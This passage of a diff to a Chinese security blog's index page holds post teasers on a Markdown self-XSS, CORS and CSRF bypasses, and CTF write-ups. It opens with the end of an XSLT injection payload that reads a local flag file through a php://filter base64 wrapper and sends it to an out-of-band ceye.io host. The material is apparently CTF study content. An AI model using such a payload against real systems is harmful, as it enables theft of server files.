<span class="hljs-attr">select</span>=<span class="hljs-string">&quot;document(&apos;php://filter/read=convert.base64-encode/resource=C:/temp/flag.txt&apos;)&quot;</span> /&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name2&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;concat(&apos;http://kih9lq.ceye.io/?&apos;, $name1)&quot;</span> /&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;<span class="hljs-name">xsl:variable</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;name3&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;document($name2)&quot;</span> /&gt;</span></span><br><span class="line"><span class="hljs-tag">&lt;/<span class="hljs-name">xsl:stylesheet</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>&#x53C2;&#x8003;&#x8FD9;&#x4E00;&#x7BC7;&#xFF1A;<a href="https://www.anquanke.com/post/id/156227#h3-5" target="_blank" rel="noopener">https://www.anquanke.com/post/id/156227</a></p>
+<p>CTF&#x4F8B;&#x5B50;&#xFF1A;<a href="https://skysec.top/2018/03/23/%E4%BB%8Esql%E6%B3%A8%E5%85%A5%E5%88%B0xslt%E5%86%8D%E5%88%B0xxe%E7%9A%84%E4%B8%80%E9%81%93ctf%E9%A2%98%E7%9B%AE/#%E6%80%9D%E8%80%83%E6%94%BB%E5%87%BB%E7%82%B9" target="_blank" rel="noopener">https://skysec.top/2018/03/23/&#x4ECE;sql&#x6CE8;&#x5165;&#x5230;xslt&#x518D;&#x5230;xxe&#x7684;&#x4E00;&#x9053;ctf&#x9898;&#x76EE;/#&#x601D;&#x8003;&#x653B;&#x51FB;&#x70B9;</a></p>
+
+    
+    </div>
+    
+    
+</article>
+
+
+
+
+    
+        <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            <a href="/2020/04/28/Markdown_Self_xss/" itemprop="url">偶遇Markdown类型的Self xss</a>
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2020-04-28T04:00:00.000Z" itemprop="datePublished">Apr 28 2020</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/技术文章/">技术文章</a>
+        </span>
+        
+        
+        <span class="column is-narrow">
+            
+            
+            5 minutes lesen (Über 777 Wörter)
+        </span>
+        
+    </div>
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <p>&#x4ECA;&#x5929;&#x9047;&#x5230;&#x4E86;&#x4E00;&#x4E2A;Markdown&#x7684;&#x7F16;&#x8F91;&#x5668;&#xFF0C;&#x6253;&#x5F00;&#x540E;&#x770B;&#x4E86;&#x4E00;&#x4E0B;&#x3002;&#x7A81;&#x7136;&#x60F3;&#x5230;&#x4E4B;&#x524D;&#x5728;&#x4E4B;&#x524D;&#x9047;&#x5230;&#x7684;&#x4E00;&#x4E2A;Markdown Self xss&#xFF0C;&#x5FC3;&#x60F3;&#x8FD9;&#x4E2A;&#x662F;&#x4E0D;&#x662F;&#x4E5F;&#x4F1A;&#x6709;&#x540C;&#x6837;&#x7684;&#x95EE;&#x9898;&#xFF1F;&#x4E8E;&#x662F;&#x6D4B;&#x4E86;&#x4E00;&#x4E0B;&#xFF0C;&#x7ED3;&#x679C;&#x8FD8;&#x771F;&#x627E;&#x51FA;&#x6765;&#x4E86;&#x3002;&#x66F4;&#x5DE7;&#x7684;&#x662F;&#xFF0C;&#x4ECA;&#x665A;&#x4E0A;&#x5B66;&#x4E60;&#x6B63;&#x5219;&#x8868;&#x8FBE;&#x5F0F;&#x7684;&#x65F6;&#x5019;&#xFF0C;&#x7ADF;&#x7136;&#x6B63;&#x597D;&#x5B66;&#x5230;&#x5339;&#x914D;Markdown&#x6807;&#x7B7E;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x800C;&#x4E14;&#x5339;&#x914D;&#x4E4B;&#x540E;&#x4F1A;&#x51FA;&#x73B0;&#x7684;&#x60C5;&#x51B5;&#x8DDF;&#x6211;&#x4ECA;&#x5929;&#x6D4B;&#x8BD5;&#x7684;&#x4E00;&#x6A21;&#x4E00;&#x6837;~ </p>
+<p>&#x4EE5;&#x524D;&#x4E5F;&#x603B;&#x7ED3;&#x8FC7;&#x5173;&#x4E8E;Markdown&#x4E2D;&#x7684;xss&#xFF0C;&#x9664;&#x4E86;&#x76F4;&#x63A5;&#x628A;xss payload&#x590D;&#x5236;&#x5230;&#x7F16;&#x8F91;&#x6846;&#x4EE5;&#x5916;&#xFF0C;&#x8FD8;&#x6709;&#x6784;&#x9020;markdown&#x7684;&#x4E00;&#x4E9B;&#x6807;&#x7B7E;&#xFF1A;</p>
+<epacse hidden>14</epacse>
+        <p class="article-more-link">
+            <a href="/2020/04/28/Markdown_Self_xss/#more">mehr</a>
+        </p>
+    
+    </div>
+    
+    
+</article>
+
+
+
+
     
         <article class="article content gallery" itemscope itemprop="blogPost">
     <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
@@ -227,7 +393,7 @@
     <div class="article-entry is-size-6-mobile" itemprop="articleBody">
     
         <h2 id="Origin-amp-Referer-Bypass"><a href="#Origin-amp-Referer-Bypass" class="headerlink" title="Origin &amp; Referer  Bypass"></a>Origin &amp; Referer  Bypass</h2><h3 id="Null&#x503C;&#x7ED5;&#x8FC7;"><a href="#Null&#x503C;&#x7ED5;&#x8FC7;" class="headerlink" title="Null&#x503C;&#x7ED5;&#x8FC7;"></a>Null&#x503C;&#x7ED5;&#x8FC7;</h3><p>&#x5F53;&#x9047;&#x5230;&#x4E00;&#x4E2A;cors&#x53EF;&#x7528;null&#x503C;&#x7ED5;&#x8FC7;&#x65F6;&#xFF0C;&#x7528;iframe&#x914D;&#x5408;data&#x534F;&#x8BAE;&#xFF0C;&#x5C31;&#x53EF;&#x4EE5;&#x53D1;&#x9001;&#x4E00;&#x4E2A;origin&#x4E3A;null&#x7684;&#x8BF7;&#x6C42;&#x3002;&#x8FD9;&#x4E2A;&#x7ED5;&#x8FC7;&#x65B9;&#x5F0F;&#x540C;&#x6837;&#x4E5F;&#x53EF;&#x4EE5;&#x7528;&#x5728;CSRF&#x8FD9;&#x91CC;&#x3002;</p>
-<epacse hidden>4</epacse>
+<epacse hidden>17</epacse>
         <p class="article-more-link">
             <a href="/2020/02/25/CSRF绕过整理/#more">mehr</a>
         </p>
@@ -268,7 +434,7 @@
     <div class="article-entry is-size-6-mobile" itemprop="articleBody">
     
         <p>&#x521A;&#x5165;&#x95E8;&#x7684;&#x65F6;&#x5019;&#x4E5F;&#x5B66;&#x4E60;&#x8FC7;CORS&#xFF0C;&#x90A3;&#x4E2A;&#x65F6;&#x5019;&#x7684;&#x5BF9;&#x5BFB;&#x627E;&#x6F0F;&#x6D1E;&#x7684;&#x6807;&#x51C6;&#x662F;&#xFF1A;</p>
-<epacse hidden>82</epacse>
+<epacse hidden>24</epacse>
 
 <p>&#x539F;&#x7406;&#x3001;&#x5229;&#x7528;&#x3001;&#x7ED5;&#x8FC7;&#x90FD;&#x6CA1;&#x6709;&#x8FDB;&#x4E00;&#x6B65;&#x4E86;&#x89E3;&#x3002;&#x8FD9;&#x6B21;&#x8D81;&#x7740;&#x5B9E;&#x4E60;&#x7684;&#x673A;&#x4F1A;&#xFF0C;&#x597D;&#x597D;&#x7684;&#x5C06;CORS&#x76F8;&#x5173;&#x77E5;&#x8BC6;&#x603B;&#x7ED3;&#x4E00;&#x4E0B;&#xFF0C;&#x5E76;&#x5BF9;&#x4E00;&#x4E9B;&#x57FA;&#x672C;&#x539F;&#x7406;&#x8FDB;&#x884C;&#x4E00;&#x4E2A;&#x68B3;&#x7406;&#x3002;</p>
         <p class="article-more-link">
@@ -448,90 +614,6 @@
 
 
     
-        <article class="article content gallery" itemscope itemprop="blogPost">
-    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
-        
-            <a href="/2019/12/18/2019 Redhat决赛 Writeup/" itemprop="url">2019 RedHat决赛 Writeup</a>
-        
-    </h1>
-    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
-        <span class="column is-narrow">
-            <time datetime="2019-12-18T03:27:29.690Z" itemprop="datePublished">Dec 18 2019</time>
-        </span>
-        
-        <span class="column is-narrow article-category">
-            <i class="far fa-folder"></i>
-            <a class="article-category-link" href="/categories/技术文章/">技术文章</a>
-        </span>
-        
-        
-        <span class="column is-narrow">
-            
-            
-            12 minutes lesen (Über 1734 Wörter)
-        </span>
-        
-    </div>
-    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
-    
-        <p><em>Threezh1 Jokuuy Playmaker 2019&#x5E74;11&#x6708;23&#x65E5;</em></p>
-<p>&#x79BB;&#x7ED3;&#x675F;&#x53EA;&#x6709;40&#x591A;&#x5206;&#x949F;&#x4E86;&#xFF0C;web&#x9898;ak&#x4E86;&#x4E4B;&#x540E;&#x4E0D;&#x4F1A;&#x4FEE;&#x2026; &#x628A;wp&#x5199;&#x4E00;&#x4E0B;&#x5427;&#x3002;web&#x56DB;&#x4E2A;&#x9898;&#x90FD;&#x662F;&#x7B80;&#x5355;&#x7684;&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;&#x9898;&#x3002;</p>
-<h2 id="&#x7CA4;&#x6E7E;&#x57FA;&#x91D1;"><a href="#&#x7CA4;&#x6E7E;&#x57FA;&#x91D1;" class="headerlink" title="&#x7CA4;&#x6E7E;&#x57FA;&#x91D1;"></a>&#x7CA4;&#x6E7E;&#x57FA;&#x91D1;</h2><p>&#x5730;&#x5740;&#xFF1A; <a href="http://172.16.9.41:9005/" target="_blank" rel="noopener">http://172.16.9.41:9005/</a> </p>
-<p>&#x662F;&#x4E00;&#x4E2A;TPshop&#x7684;&#x5546;&#x57CE;&#x6846;&#x67B6;&#xFF0C;&#x754C;&#x9762;&#x5982;&#x56FE;&#x6240;&#x793A;&#xFF1A;<br></p>
-        <p class="article-more-link">
-            <a href="/2019/12/18/2019 Redhat决赛 Writeup/#more">mehr</a>
-        </p>
-    
-    </div>
-    
-    
-</article>
-
-
-
-
-    
-        <article class="article content gallery" itemscope itemprop="blogPost">
-    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
-        
-            <a href="/2019/10/07/OKLite 1.2.25 几处getshell审计分析/" itemprop="url">OKLite 1.2.25 几处getshell审计分析</a>
-        
-    </h1>
-    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
-        <span class="column is-narrow">
-            <time datetime="2019-10-07T04:00:00.000Z" itemprop="datePublished">Oct 7 2019</time>
-        </span>
-        
-        <span class="column is-narrow article-category">
-            <i class="far fa-folder"></i>
-            <a class="article-category-link" href="/categories/技术文章/">技术文章</a>
-        </span>
-        
-        
-        <span class="column is-narrow">
-            
-            
-            29 minutes lesen (Über 4327 Wörter)
-        </span>
-        
-    </div>
-    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
-    
-        <h2 id="OKLite&#x4ECB;&#x7ECD;"><a href="#OKLite&#x4ECB;&#x7ECD;" class="headerlink" title="OKLite&#x4ECB;&#x7ECD;"></a>OKLite&#x4ECB;&#x7ECD;</h2><p>OKLite&#x662F;&#x4E00;&#x5957;&#x6781;&#x7B80;&#x4F01;&#x4E1A;&#x7AD9;&#x7CFB;&#x7EDF;&#xFF0C;&#x4E3B;&#x8981;&#x76EE;&#x6807;&#x7FA4;&#x4F53;&#x662F;&#x5C55;&#x793A;&#x578B;&#x4F01;&#x4E1A;&#x7F51;&#x7AD9;&#x7528;&#x6237;&#xFF0C;&#x8BA9;&#x4F20;&#x7EDF;&#x5C0F;&#x4F01;&#x4E1A;&#x5FEB;&#x901F;&#x5E03;&#x7F72;&#x7F51;&#x7AD9;&#xFF0C;&#x52A0;&#x5F3A;&#x81EA;&#x8EAB;&#x54C1;&#x724C;&#x610F;&#x8BC6;&#xFF0C;&#x5B9E;&#x73B0;&#x5BF9;&#x516C;&#x53F8;&#x5F62;&#x8C61;&#x7684;&#x5BA3;&#x4F20;&#x3002;&#x672C;&#x7CFB;&#x7EDF;&#x6700;&#x521D;&#x662F;PHPOK&#x7A0B;&#x5E8F;&#x7CBE;&#x7B80;&#x800C;&#x6765;&#x3002;&#x5728;&#x540C;&#x7B49;&#x914D;&#x7F6E;&#x4E0B;&#xFF0C;OKLite&#x901F;&#x5EA6;&#x4F18;&#x4E8E;PHPOK&#x8FBE;30%&#x4EE5;&#x4E0A;&#x3002; (&#x6B64;&#x7248;&#x672C;&#x5728;2018&#x5E74;&#x5DF2;&#x505C;&#x6B62;&#x7EF4;&#x62A4;)</p>
-<p>&#x7CFB;&#x7EDF;&#x94FE;&#x63A5;&#xFF1A;<a href="https://www.phpok.com/oklite.html" target="_blank" rel="noopener">https://www.phpok.com/oklite.html</a><br></p>
-        <p class="article-more-link">
-            <a href="/2019/10/07/OKLite 1.2.25 几处getshell审计分析/#more">mehr</a>
-        </p>
-    
-    </div>
-    
-    
-</article>
-
-
-
-
-    
     
         
 <nav class="pagination is-centered is-rounded" role="navigation" aria-label="pagination">
@@ -547,9 +629,9 @@
         
         <li><a class="pagination-link" href="/page/2/">2</a></li>
         
-        <li><a class="pagination-link" href="/page/3/">3</a></li>
+        <li><span class="pagination-ellipsis">&hellip;</span></li>
         
-        <li><a class="pagination-link" href="/page/4/">4</a></li>
+        <li><a class="pagination-link" href="/page/5/">5</a></li>
         
     </ul>
 </nav>
@@ -757,7 +839,7 @@ document.addEventListener("DOMContentLoaded", function() {
                 PAGES: 'Seiten',
                 CATEGORIES: 'Kategorien',
                 TAGS: 'Tags',
-                UNTITLED: '(Untitled)',
+                UNTITLED: '(Sin título)',
             },
             CONTENT_URL: '/content.json',
         };
